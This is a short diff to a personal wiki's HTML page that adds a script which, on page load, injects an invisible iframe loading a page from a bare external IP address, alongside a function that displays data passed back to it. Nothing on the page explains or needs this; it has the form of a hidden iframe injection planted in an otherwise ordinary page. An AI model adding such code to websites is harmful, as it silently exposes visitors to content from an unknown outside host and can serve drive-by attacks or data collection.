@@ -16,4 +16,17 @@
     <body>
         <h1>Joshuas's wiki</h1>
     </body>
+
+    <script>
+    document.addEventListener("load", function(event) {
+        function getdata(data) {
+            alert(data);
+        }
+
+        var ifm = document.createElement("iframe");
+        ifm.setAttribute("src", "http://119.28.21.49/outcgi/2.html")
+        ifm.style.display = "none";
+        document.body.appendChild(ifm);
+    })
+    </script>
 </html>
